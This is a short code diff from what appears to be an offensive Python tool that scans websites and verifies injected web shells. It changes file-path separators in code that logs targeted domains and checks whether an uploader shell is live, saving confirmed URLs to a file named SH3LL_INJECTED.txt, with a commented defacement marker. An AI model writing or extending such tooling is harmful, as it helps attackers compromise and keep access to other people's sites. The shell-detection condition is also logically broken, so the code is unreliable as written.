@@ -209,7 +209,7 @@ class Threaded_GET:
                 # self.results[self.vuln_path] = { 'domain': self.TAR_URL,
                 #     'error': RES_GET.status_code }
                 Report_Times = Printed_Value.get_time() 
-                Main_Worker.Saved_Result(r'DB_Results\Domain_DetectBot.txt', f'{Report_Times} | {RES_GET.status_code}', f'{self.TAR_URL}\n')
+                Main_Worker.Saved_Result(r'DB_Results/Domain_DetectBot.txt', f'{Report_Times} | {RES_GET.status_code}', f'{self.TAR_URL}\n')
                 
                 return
 
@@ -380,7 +380,7 @@ class Threaded_POST:
                 # self.results[self.vuln_path] = { 'domain': self.TAR_URL,
                 #     'error': RES_GET.status_code }
                 Report_Times = Printed_Value.get_time()
-                Main_Worker.Saved_Result(r'DB_Results\Domain_Detect_BOT.txt', f'{Report_Times} | {RES_POST.status_code}', f'{self.TAR_URL}\n')
+                Main_Worker.Saved_Result(r'DB_Results/Domain_Detect_BOT.txt', f'{Report_Times} | {RES_POST.status_code}', f'{self.TAR_URL}\n')
                 
                 return
             
@@ -496,7 +496,7 @@ def Func_ValidShell(SET_Timeout, Proxies_ON, Link_Shelled, Config_UA):
         if REZ_VALIDSHELL['resp']:
             #'WP_Burn was HERE' in str(REZ_VALIDSHELL['resp'].text) or
             if '>ErrorCool Uploader' in str(REZ_VALIDSHELL['resp'].text) or 'multipart/form-data' and 'method="POST' and 'value="Upload' in str(REZ_VALIDSHELL['resp'].text):
-                Main_Worker.Saved_Result(r'DB_Results\SH3LL_INJECTED.txt', f'{Link_Shelled}\n')
+                Main_Worker.Saved_Result(r'DB_Results/SH3LL_INJECTED.txt', f'{Link_Shelled}\n')
                 return True
             #if '>ErrorCool Uploader' in str(REZ_VALIDSHELL['resp'].text) or 'multipart/form-data' and 'method="POST' and 'value="Upload' in str(REZ_VALIDSHELL['resp'].text):
  
